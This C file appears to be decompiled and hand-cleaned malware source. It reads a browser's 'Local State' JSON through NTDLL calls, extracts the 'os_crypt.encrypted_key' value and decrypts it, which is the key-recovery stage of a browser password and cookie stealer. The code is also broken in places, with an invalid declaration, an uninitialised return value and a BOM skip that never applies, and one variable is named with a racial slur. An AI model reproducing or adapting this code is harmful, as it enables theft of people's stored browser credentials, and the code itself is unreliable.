#include "../HEADER/HEADER.h"

int __fastcall 
ExtractFileInfoViaNTDLL(void *TheRealOne_, 
                        DWORD *encryptedKey, 
                        size_t *resultLength)
{
    void *IoStatusBlock = NULL;
    DWORD *FileInformation = NULL;
    size_t IthinkGetthe_Length = 0;
    void *someMEM = NULL;

    int FileHandle = checkFileStatus(TheRealOne_);
    if (FileHandle == -1) {
        return -1;
    }
  
    IoStatusBlock = calloc(8, 1);
    if (IoStatusBlock == NULL) {
        return -1;
    }

    FileInformation = malloc(24);
    if (FileInformation == NULL) {
        free(IoStatusBlock);
        return -1;
    }

    NtQueryInformationFile(FileHandle, IoStatusBlock, FileInformation, 24, 5);

    IthinkGetthe_Length = FileInformation[2];
    *resultLength = IthinkGetthe_Length;

    someMEM = malloc(IthinkGetthe_Length);
    if (someMEM == NULL) {
        free(IoStatusBlock);
        free(FileInformation);
        return -1;
    }

    *encryptedKey = (_DWORD *)someMEM;

    NtReadFile(FileHandle, 0, 0, 0, IoStatusBlock, someMEM, IthinkGetthe_Length, 0, 0);

    NtClose(FileHandle);

    free(IoStatusBlock);
    free(FileInformation);

    return 0;
}

DWORD *__fastcall 
ParseKeyValueData(const char **key, 
                  unsigned int depth)
{
  int currentChar;
  bool isValidValue;
  int tempValue;
  int processedValue;
  int stringLength;
  void *parsedString;
  _DWORD *resultData;
  int validationCheck;
  int index;
  
  if (depth > 0x800)
    return 0;
  
  while (isspace(*(unsigned __int8 *)*key))
    ++*key;
  
  currentChar = **key;
  if (currentChar > 54)
  {
    if (currentChar > 102)
    {
      if (currentChar == 110)
      {
        if (strncmp("null", *key, 4u))
          return 0;
        
        *key += 4;
        return allocateInitializesomeMEM();
      }
      
      if (currentChar != 116)
      {
        if (currentChar != 123)
          return 0;
        
        return ParseAndValidtKeyStrct(key, depth + 1);
      }
    }
    else if (currentChar != 102)
    {
      tempValue = currentChar - 55;
      if (!tempValue)
        return (_DWORD *)TransValdatformKey((char **)key);
      
      processedValue = tempValue - 1;
      if (!processedValue)
        return (_DWORD *)TransValdatformKey((char **)key);
      
      index = processedValue - 1;
      if (!index)
        return (_DWORD *)TransValdatformKey((char **)key);
      
      if (index != 34)
        return 0;
      
      return (_DWORD *)ParseAndValidtArrayStrct(key, depth + 1);
    }
    return checkBooleanValue(key);
  }
  
  if (currentChar == 54)
    return (_DWORD *)TransValdatformKey((char **)key);
  
  if (currentChar > 50)
  {
    validationCheck = currentChar - 51;
    if (!validationCheck)
      return (_DWORD *)TransValdatformKey((char **)key);
    
    tempValue = validationCheck - 1;
    isValidValue = (tempValue == 0);
    goto LABEL_12;
  }
  
  if (currentChar == 50)
    return (_DWORD *)TransValdatformKey((char **)key);
  
  stringLength = currentChar - 34;
  if (stringLength)
  {
    validationCheck = stringLength - 11;
    if (!validationCheck)
      return (_DWORD *)TransValdatformKey((char **)key);
    
    tempValue = validationCheck - 3;
    isValidValue = (tempValue == 0);
    
LABEL_12:
    if (isValidValue || tempValue == 1)
      return (_DWORD *)TransValdatformKey((char **)key);
    
    return 0;
  }

  resultData = 0;
  parsedString = 0;
  validationCheck = StringParsWithEscape(key, (int)&parsedString);
  
  if (!parsedString)
    return (_DWORD *)resultData;
  
  resultData = Alloc_StoreData(parsedString, (int)parsedString);
  if (resultData)
    return resultData;
  
  free(parsedString);
  return (_DWORD *)resultData;
}

DWORD *__thiscall 
StripUTF8BOMAndParse(const char *encryptedKey)
{
    if (encryptedKey == NULL) {
        return NULL;
    }
    const char *niggi = encryptedKey;
    if (encryptedKey[0] == (char)0xEF && 
        encryptedKey[1] == (char)0xBB && 
        encryptedKey[2] == (char)0xBF) {
        encryptedKey += 3; // Skip BOM if present
    }

    return ParseKeyValueData(&niggi, 0);
}

int __fastcall PerformHashTableLookup(
        _DWORD *hashTable,
        const char *queryString,
        size_t queryLength,
        int queryHash,
        _DWORD *foundFlag)
{
  unsigned int tableSize;
  int probeOffset, hashIndex, currentIndex, entryIndex, originalHashIndex;
  char *storedString;

  tableSize = hashTable[8];
  probeOffset = 0;
  *foundFlag = 0;
  hashIndex = queryHash & (tableSize - 1);
  originalHashIndex = hashIndex;

  if (!tableSize)
    return -1;

  while (1)
  {
    currentIndex = (tableSize - 1) & (probeOffset + hashIndex);
    entryIndex = *(_DWORD *)(hashTable[1] + 4 * currentIndex);

    if (entryIndex == -1)
      break;

    hashIndex = originalHashIndex;

    if (queryHash == *(_DWORD *)(hashTable[2] + 4 * entryIndex))
    {
      storedString = *(char **)(hashTable[3] + 4 * entryIndex);

      if (strlen(storedString) == queryLength)
      {
        if (!strncmp(queryString, storedString, queryLength))
        {
          *foundFlag = 1;
          return currentIndex;
        }
        hashIndex = originalHashIndex;
      }
    }

    tableSize = hashTable[8];
    if (++probeOffset >= tableSize)
      return -1;
  }

  return currentIndex;
}

int __fastcall
ComputeDJB2Hash(int inputString,
                unsigned int inputLength)
{
  unsigned int index;
  int hash;
  unsigned __int8 currentChar;

  index = 0;
  for ( hash = 5381; index < inputLength; ++index )
  {
    currentChar = *(_BYTE *)(index + inputString);
    if ( !currentChar )
      break;
    hash = currentChar + 33 * hash;
  }
  return hash;
}

int __fastcall 
LookupHashedIndexValue(DWORD *table, 
                       const char *inputString, 
                       size_t inputLength)
{
  int hashValue;
  int lookupIndex;
  int foundFlag;

  if ( table
    && inputString
    && (hashValue = ComputeDJB2Hash((int)inputString, inputLength),
        foundFlag = 0,
        lookupIndex = PerformHashTableLookup(table, inputString, inputLength, hashValue, &foundFlag),
        foundFlag) )
  {
    return *(_DWORD *)(table[4] + 4 * *(_DWORD *)(table[1] + 4 * lookupIndex));
  }
  else
  {
    return 0;
  }
}

int __thiscall 
ValidateKeyStructure(DWORD *keyV)
{
  if ( keyV && keyV[1] == 4 )
    return keyV[2];
  else
    return 0;
}

int __fastcall 
ExtractValueFromKeyPath(DWORD *table, 
                        const char *key)
{
  const char *segmentStart;
  char *dotPosition;
  DWORD *hashedValue;
  char *nextSegment;

  segmentStart = key;
  for ( dotPosition = strchr(key, '.'); ; dotPosition = strchr(nextSegment + 1, '.') )
  {
    nextSegment = dotPosition;
    if ( !dotPosition )
      break;
    hashedValue = (_DWORD *)LookupHashedIndexValue(table, segmentStart, dotPosition - segmentStart);
    segmentStart = nextSegment + 1;
    table = (_DWORD *)ValidateKeyStructure(hashedValue);
  }
  if ( table && segmentStart )
    return LookupHashedIndexValue(table, segmentStart, strlen(segmentStart));
  else
    return 0;
}

DWORD *__thiscall 
RetrieveKeyFromStructure(DWORD *keyStrct)
{
  int keyType;
  DWORD *keyValue, *result;

  if (keyStrct)
    keyType = keyStrct[1];
  else
    keyType = -1;

  keyValue = keyStrct + 2;
  result = 0;

  if (keyType == 2)
    return keyValue;

  return result;
}


void
DecryptKeyData(const WCHAR *TheRealOne_, 
              int *rawFileData, 
              int *fileDataSize) // fileDataSize == is the length of the key....
{ 
    DWORD *Resutl, *Resutl_, *Resutl__;
    int *keyStorageLocation, int encryptedKey_;
    char *encryptedData;
    void *decryptedBuffer;
    int dataLength, processedData_1, dataLength_2;
    size_t resultLength = 0;
    const char *encryptedKey = NULL;

    ExtractFileInfoViaNTDLL(TheRealOne_, (unsigned int *)&encryptedKey, &resultLength);
    Resutl = (DWORD *)StripUTF8BOMAndParse(encryptedKey);
    Resutl_ = (DWORD *)ValidateKeyStructure(Resutl);
    Resutl__ = (DWORD *)ExtractValueFromKeyPath(Resutl_, "os_crypt.encrypted_key");
    keyStorageLocation = RetrieveKeyFromStructure(Resutl__);

    if (keyStorageLocation) {
        encryptedKey_ = *keyStorageLocation;
    } else {
        encryptedKey_ = 0;
    }

    dataLength = 512;
    encryptedData = (char *)malloc(0x200);
    if (!encryptedData) {
        fprintf(stderr, "Memory allocation failed for encrypted data\n");
        return;
    }
  
    CryptDecryptFunction(encryptedKey_, 0, 1, encryptedData, &dataLength, 0, 0);

    decryptedBuffer = malloc(0x200);
    if (!decryptedBuffer) {
        fprintf(stderr, "Memory allocation failed for decrypted buffer\n");
        free(encryptedData);
        return;
    }

    memmove(decryptedBuffer, encryptedData + 5, dataLength - 5);

    _DWORD dataLength_1[2] = {dataLength - 5, (unsigned int)decryptedBuffer};
    dataLength_2 = 0;
    ProcessDataFunction(dataLength_1, 0, 0, 0, 0, 0, &dataLength_2);

    *rawFileData = processedData_1;
    *fileDataSize = dataLength_2;

    free(decryptedBuffer);
    free(encryptedData);
}
